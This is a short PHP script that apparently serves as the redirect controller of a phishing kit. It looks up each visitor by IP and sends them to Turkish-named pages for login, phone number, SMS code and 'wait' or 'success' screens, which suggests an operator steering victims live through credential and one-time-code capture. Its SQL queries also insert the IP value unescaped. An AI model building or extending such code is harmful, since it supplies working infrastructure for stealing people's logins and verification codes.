<?php
require_once 'connect.php';

header('Content-Type: application/json');

$ip = IP;
$redirect = $db->query("SELECT * FROM redirect WHERE ipAddress = '$ip'")->fetch(PDO::FETCH_OBJ);

if ($redirect) {
    $target = "";

    if ($redirect->page == "sms") {
        $target = "sms.php";
    } else if ($redirect->page == "sms2") {
        $target = "hatali-sms.php";
    } else if ($redirect->page == "tebrik") {
        $target = "basarili.php";
    } else if ($redirect->page == "hata") {
        $target = "sms.php?suredoldu=1";
    } else if ($redirect->page == "hata2") {
        $target = "giris.php?hata=1";
    } else if ($redirect->page == "hata3") {
        $target = "telefon.php?hata=1";
    } else if ($redirect->page == "basadondur") {
        $target = "index.php";
    } else if ($redirect->page == "onay") {
        $target = "mobil-onay.php";
    } else if ($redirect->page == "tel") {
        $target = "telefon.php";
    } else if ($redirect->page == "bilgi") {
        $target = "bekle.php";
    }

    if ($target !== "") {
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
        echo json_encode(['redirect' => $target]);
        exit;
    }
}

echo json_encode(['redirect' => null]);
